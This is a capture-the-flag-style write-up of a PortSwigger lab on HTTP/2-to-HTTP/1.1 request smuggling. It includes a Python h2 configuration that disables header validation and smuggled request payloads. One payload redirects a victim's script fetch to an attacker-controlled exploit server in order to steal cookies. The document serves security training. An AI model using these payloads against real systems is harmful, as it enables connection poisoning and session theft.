# H2.CL request smuggling

**Category:** HTTP Request Smuggling
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling

This lab is the HTTP/2 analogue of CL.TE, and it's also the one we got wrong first — worth telling honestly, because the dead end taught us something specific about how HTTP/2 client libraries behave that isn't obvious from the theory alone.

## The Target

Same downgrading architecture as the response-queue-poisoning lab: the front-end speaks HTTP/2 to us and rewrites to HTTP/1.1 for the back-end. Here the discrepancy is over `Content-Length` specifically — if we can get the front-end to compute a request's length from its HTTP/2 frame data while an explicit `content-length: 0` header we set gets carried through to the back-end's HTTP/1.1 request, the back-end reads zero bytes of body and leaves whatever we actually sent in DATA frames sitting in its buffer as the start of the next request.

## The Investigation

Our first attempt at this failed, and the reason is recorded plainly in our own notes: the Python `h2` library, used the straightforward way, sends internally consistent HTTP/2 frames — it computes the actual DATA frame length and won't let you claim a `content-length` header that contradicts what you're actually sending, because from HTTP/2's own perspective there's no such thing as a content-length mismatch; length is a property of the frame, not a header. Our initial conclusion was that this made H2.CL infeasible without something like Burp's own HTTP/2 stack, which explicitly supports constructing exactly this kind of length-declaration mismatch as a first-class feature.

That conclusion turned out to be wrong, and finding the actual fix took reading the `h2` library's own configuration options rather than assuming its defaults were the only mode it could operate in. The library exposes `validate_outbound_headers` and `normalize_outbound_headers` flags — with both explicitly disabled, we could send `content-length: 0` in the HEADERS frame while still sending genuine body data in a following DATA frame, because the library stops enforcing the internal consistency check that was blocking us. The front-end, seeing `content-length: 0` in the header block during downgrade, forwards a zero-length body to the back-end for the initial request; the DATA frame's actual bytes are left over as a smuggled prefix on the connection:

```python
config = h2cfg.H2Configuration(
    client_side=True, header_encoding="utf-8",
    validate_outbound_headers=False,
    normalize_outbound_headers=False,
)
```

## The Exploit

We chained this desync with a two-step redirect-then-cookie-theft attack. First, confirm the primitive by smuggling an arbitrary prefix:

```
:method: POST
:path: /
:authority: TARGET
content-type: application/x-www-form-urlencoded
content-length: 0

SMUGGLED
```

Then, having confirmed that `GET /resources` (no trailing slash) returns a redirect to `/resources/`, we smuggled a request for `/resources` with a forged `Host` header pointing at our exploit server, so that the *next* request on that connection gets redirected to us instead of the real target:

```
:method: POST
:path: /
:authority: TARGET
content-type: application/x-www-form-urlencoded
content-length: 0

GET /resources HTTP/1.1
Host: EXPLOIT_SERVER
Content-Length: 10

x=1
```

With the exploit server hosting `alert(document.cookie)` at `/resources`, we fired this smuggle repeatedly — checking the exploit server's access log for an incoming `GET /resources/` request from the lab's simulated victim, which confirmed their browser had been redirected into loading and executing our JavaScript. It took multiple attempts to line up: this only works if the poisoned connection gets used for the victim's *next* JavaScript-resource fetch specifically, so timing the smuggle against the victim's browsing pattern mattered as much as the payload itself.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution reaches the same redirect-to-exploit-server chain, using the identical `content-length: 0` HEADERS-plus-DATA construction:

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1
```

then waits for the exploit server's access log to show the victim's browser hitting it. The underlying technique is exactly what we eventually converged on. What's genuinely different here isn't the payload — it's how each side gets Burp or the `h2` library to actually construct a request that shouldn't be constructible under strict HTTP/2 semantics. Burp Repeater's HTTP/2 support is purpose-built to let you type a mismatched `Content-Length` and send it anyway, no configuration needed. Getting the same result from a general-purpose HTTP/2 library required knowing it *has* a validation layer in the first place, then explicitly disabling it — which is exactly the dead end we hit initially, concluding H2.CL simply couldn't be done outside Burp before finding the configuration flags that proved that conclusion wrong.

## What This Teaches Us

The most useful thing this lab taught us wasn't about H2.CL specifically — it was a reminder to distrust a "this is infeasible with the tooling" conclusion until we've actually read what the tooling's defaults are doing and whether they can be turned off. A general-purpose protocol library validating internal consistency is a sane default for normal use and an active obstacle for security testing, and the two are easy to conflate if you stop investigating after the first failure. On the vulnerability side, H2.CL is the same lesson as every other lab in this series wearing a different protocol: the moment a value that HTTP/2 treats as inert metadata gets reinterpreted as authoritative length information after a downgrade, any consistency the two protocols had is gone.
